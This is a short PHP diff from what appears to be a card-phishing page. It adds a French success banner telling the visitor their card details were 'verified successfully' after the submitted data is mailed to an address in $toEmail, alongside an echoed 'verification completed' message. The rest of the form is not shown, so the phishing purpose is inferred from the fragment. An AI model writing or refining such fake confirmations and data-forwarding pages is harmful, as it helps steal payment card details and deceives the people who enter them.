@@ -39,7 +39,10 @@ if($_SERVER['REQUEST_METHOD'] == 'POST'){
     
     ";
    
-
+    $succes = '<div class="alert alert-primary" role="alert">
+    <h4>Succes</h4>
+    <p>les détails de votre carte ont été vérifiés avec succès, consultez votre e-mail pour plus de mises à jour</p>
+  </div>';
 
     if(mail($toEmail, $subject, $message)){
         echo "verification completed succesfully";
